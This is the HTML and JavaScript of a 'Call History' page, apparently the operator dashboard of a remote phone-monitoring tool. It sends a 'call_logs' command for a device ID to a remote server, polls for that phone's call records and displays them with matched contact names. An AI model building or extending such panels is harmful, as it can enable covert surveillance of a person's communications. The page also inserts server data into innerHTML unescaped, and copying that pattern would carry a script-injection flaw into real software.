<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Call History</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --glass-bg: rgba(20, 20, 20, 0.85);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text-main: #ffffff;
            --text-sub: #8e8e93;
            --incoming: #30d158;
            --outgoing: #0a84ff;
            --missed: #ff453a;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(135deg, #000000 0%, #1c1c1e 100%);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0; 
            padding: 0;
            min-height: 100vh;
            width: 100vw;
            display: flex; 
            justify-content: center;
            align-items: flex-start;
            overflow-y: auto;
        }

        .container {
            width: 100%; 
            max-width: 450px;
            min-height: 100vh;
            background: var(--bg-color);
            display: flex;
            flex-direction: column; 
            position: relative;
        }

        /* --- HEADER --- */
        .header {
            position: sticky;
            top: 0;
            z-index: 100;
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            padding: 15px 20px;
            border-bottom: 0.5px solid var(--glass-border);
        }

        .header-left { display: flex; align-items: center; }
        .header-right { display: flex; align-items: center; gap: 10px; }

        .back-btn {
            color: var(--outgoing); font-size: 1.2rem;
            text-decoration: none; width: 30px; height: 30px;
            display: flex; align-items: center; justify-content: center;
        }

        .page-title { 
            position: absolute; left: 50%; transform: translateX(-50%);
            font-size: 1.1rem; font-weight: 600; letter-spacing: 0.5px;
            color: var(--text-main); white-space: nowrap;
        }

        .live-status {
            font-size: 0.65rem; color: var(--incoming);
            display: flex; align-items: center; gap: 5px;
            background: rgba(48, 209, 88, 0.1);
            padding: 3px 8px; border-radius: 12px;
        }

        .live-dot {
            width: 6px; height: 6px; background-color: var(--incoming);
            border-radius: 50%;
            box-shadow: 0 0 5px var(--incoming);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }

        .refresh-btn {
            background: transparent; border: none;
            color: var(--text-main); font-size: 1rem; cursor: pointer; padding: 0;
        }

        /* --- LOG LIST --- */
        .log-list { 
            display: flex; 
            flex-direction: column; 
            padding: 5px 0 30px 0;
        }

        .log-card {
            padding: 12px 20px;
            display: flex; align-items: center;
            border-bottom: 0.5px solid rgba(255,255,255,0.08);
            transition: 0.2s;
        }
        
        .log-card:last-child { border-bottom: none; }
        .log-card:active { background: rgba(255,255,255,0.05); }

        .log-icon {
            font-size: 0.85rem; margin-right: 15px; width: 32px; height: 32px;
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.08);
        }
        
        .log-icon.incoming { color: var(--text-main); }
        .log-icon.outgoing { color: var(--text-main); }
        .log-icon.missed { color: var(--missed); }

        /* Main Info Container */
        .log-info { 
            flex: 1; 
            overflow: hidden; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            gap: 2px; /* Gap between Name and Number */
        }
        
        /* Top Row: Name + Date */
        .log-top-row {
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            width: 100%;
        }

        .log-name { 
            font-size: 1rem; font-weight: 600; 
            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
            color: var(--text-main);
            max-width: 70%; /* Name ko limit kiya taaki Date na dabe */
        }
        
        .log-name.is-missed { color: var(--missed); }

        /* Compact Date Style */
        .log-date {
            font-size: 0.75rem; 
            color: var(--text-sub);
            white-space: nowrap;
            margin-left: 10px;
        }

        /* Bottom Row: Number only */
        .log-details-row {
            display: flex; align-items: center;
            font-size: 0.8rem; color: var(--text-sub);
            width: 100%;
        }

        /* Truncate Number if too long */
        .log-number-text {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            width: 100%;
        }

        .call-action {
            width: 35px; height: 35px;
            display: flex; align-items: center; justify-content: center;
            color: var(--outgoing);
            font-size: 1rem;
            text-decoration: none;
            margin-left: 10px;
            background: rgba(255,255,255,0.08);
            border-radius: 50%;
        }

        .status-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
        .debug-info { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="header-left">
                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            </div>
            
            <span class="page-title">Call History</span>

            <div class="header-right">
                <div class="live-status">
                    <div class="live-dot"></div>
                    <span id="liveText">LIVE</span>
                </div>
                <button onclick="manualRefresh()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
            </div>
        </div>

        <div class="debug-info" id="debugBox"></div>
        
        <div class="log-list" id="logsContainer">
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');
        const storageKey = `calls_${DEVICE_ID}`;
        let cachedContacts = [];
        let refreshInterval;

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                alert("ID Missing!");
                window.location.href = "index.html";
                return;
            }
            detectContactsData();
            loadFromStorage();
            sendCommand();
            startLiveUpdates();
        });

        function startLiveUpdates() {
            fetchLogs();
            refreshInterval = setInterval(() => {
                fetchLogs();
            }, 3000);
        }

        function manualRefresh() {
            document.getElementById("liveText").innerText = "Updating...";
            fetchLogs();
        }

        // --- CONTACT LOGIC ---
        function detectContactsData() {
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.toLowerCase().includes("contact")) {
                        const rawData = localStorage.getItem(key);
                        if (rawData) {
                            const parsed = JSON.parse(rawData);
                            if (Array.isArray(parsed) && parsed.length > 0) {
                                cachedContacts = parsed;
                                return;
                            }
                        }
                    }
                }
            } catch (e) { console.error("Contacts error", e); }
        }

        function findContactName(phoneNumber) {
            if (!cachedContacts || cachedContacts.length === 0) return null;
            try {
                const cleanLogNum = phoneNumber.replace(/\D/g, '').slice(-10); 
                const match = cachedContacts.find(c => {
                    const contactPhone = c.phone || c.number || ""; 
                    if(!contactPhone) return false;
                    const cleanContactNum = contactPhone.toString().replace(/\D/g, '').slice(-10);
                    return cleanContactNum === cleanLogNum;
                });
                return match ? (match.name || match.display_name) : null;
            } catch (e) { return null; }
        }

        // --- NEW SHORT DATE LOGIC (1 Jan) ---
        function getValidDate(log) {
            let raw = log.date || log.timestamp || log.time || log.created_at;
            if (!raw) return null;
            let dateObj = new Date(raw);
            if (!isNaN(dateObj.getTime())) return dateObj;
            let num = Number(raw);
            if (!isNaN(num)) {
                if (num < 1000000000000) num *= 1000;
                return new Date(num);
            }
            return null;
        }

        function formatCompactDate(dateObj) {
            if (!dateObj) return "";
            const now = new Date();
            
            // Check if Today
            if (dateObj.toDateString() === now.toDateString()) {
                // Agar aaj hai toh time dikha do ya sirf "Today"
                // User requirement: "1 Jan" style. But "Today" is clearer.
                // Let's stick to short Date: "11 Jan" for everything.
            }
            
            const day = dateObj.getDate(); // 1, 12, etc.
            const month = dateObj.toLocaleString('en-US', { month: 'short' }); // Jan, Feb
            
            return `${day} ${month}`;
        }

        // --- SERVER & RENDER ---
        function loadFromStorage() {
            const savedData = localStorage.getItem(storageKey);
            if (savedData) {
                renderLogs(JSON.parse(savedData));
            } else {
                document.getElementById("logsContainer").innerHTML = `
                    <div class="status-msg"><p>Connecting...</p></div>`;
            }
        }

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'call_logs' })
            });
        }

        function fetchLogs() {
            const timestamp = new Date().getTime();
            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${timestamp}`)
                .then(response => response.json())
                .then(data => {
                    document.getElementById("liveText").innerText = `LIVE`;
                    if (data && Array.isArray(data) && data.length > 0) {
                        localStorage.setItem(storageKey, JSON.stringify(data));
                        detectContactsData();
                        renderLogs(data);
                    }
                })
                .catch(err => {
                    document.getElementById("liveText").innerText = "Connecting...";
                });
        }

        function renderLogs(data) {
            const container = document.getElementById("logsContainer");
            if(!container) return;

            data.forEach(log => {
                log._validDate = getValidDate(log);
                log._sortTime = log._validDate ? log._validDate.getTime() : 0;
            });

            data.sort((a, b) => b._sortTime - a._sortTime);

            let html = "";
            
            data.forEach(log => {
                const type = (log.type || "").toLowerCase();
                let iconClass = "incoming";
                let iconSymbol = "fa-arrow-down";
                let isMissed = false;

                if(type.includes("outgoing")) {
                    iconClass = "outgoing"; iconSymbol = "fa-arrow-up";
                } else if(type.includes("missed") || type.includes("rejected")) {
                    iconClass = "missed"; iconSymbol = "fa-xmark"; isMissed = true;
                }

                const matchedName = findContactName(log.number);
                const nameColorClass = isMissed ? "is-missed" : "";

                // Logic: Agar name hai, toh name upar, number niche.
                // Agar name nahi hai, toh number upar, "Unsaved" niche.
                let mainText = matchedName ? matchedName : log.number;
                let subText = matchedName ? log.number : "Unsaved Number";
                
                const shortDate = formatCompactDate(log._validDate);

                html += `
                    <div class="log-card">
                        <div class="log-icon ${iconClass}">
                            <i class="fa-solid ${iconSymbol}"></i>
                        </div>
                        
                        <div class="log-info">
                            <div class="log-top-row">
                                <span class="log-name ${nameColorClass}">${mainText}</span>
                                <span class="log-date">${shortDate}</span>
                            </div>
                            
                            <div class="log-details-row">
                                <span class="log-number-text">${subText}</span>
                            </div>
                        </div>

                        <a href="tel:${log.number}" class="call-action">
                            <i class="fa-solid fa-phone"></i>
                        </a>
                    </div>`;
            });

            container.innerHTML = html;
        }
    </script>
</body>
</html>
